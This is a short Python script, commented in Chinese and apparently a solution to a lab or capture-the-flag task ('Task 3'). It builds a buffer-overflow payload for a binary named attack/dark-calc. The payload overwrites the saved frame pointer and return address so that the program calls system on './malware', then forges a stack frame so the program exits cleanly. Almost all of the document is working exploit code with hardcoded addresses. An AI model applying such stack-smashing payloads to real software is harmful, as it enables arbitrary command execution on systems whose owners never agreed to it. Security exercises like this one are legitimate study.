#!/usr/bin/env python3
"""Task 3: 执行 ./malware —— 为 attack/dark-calc 生成 payload。

输入开头的 "./malware" 由 strcpy 复制进 command_buf。返回地址跳到
eval 里的 `mov edi,0x6030d0; call system` 序列，rdi 由程序自己设置，
不再依赖 strcpy 返回后保留 rdi。saved rbp 被改成固定栈上的伪造帧
（B+32），system 返回、eval 执行完 fflush 后，leave; ret 会落到
input 里的 `mov edi,0; call exit@plt`，程序以 0 退出。
"""
import struct
import sys


def p64(value):
    return struct.pack("<Q", value)


B = 0x721000800FD0          # input 的 expression[16]

payload = (
    b"./malware\x00"         # 0-9   strcpy -> command_buf
    + b"A" * 6               # 10-15
    + p64(B + 32)            # 16-23 覆盖 saved rbp，指向伪造帧
    + p64(0x401A6B)          # 24-31 eval: mov edi,0x6030d0; call system
    + p64(0xDEADBEEFCAFEBABE)  # 32-39 被 pop rbp 吃掉
    + p64(0x4019B9)[:7]      # 40-46 input 内 mov edi,0; call exit@plt
)

assert len(payload) == 47

sys.stdout.buffer.write(payload)
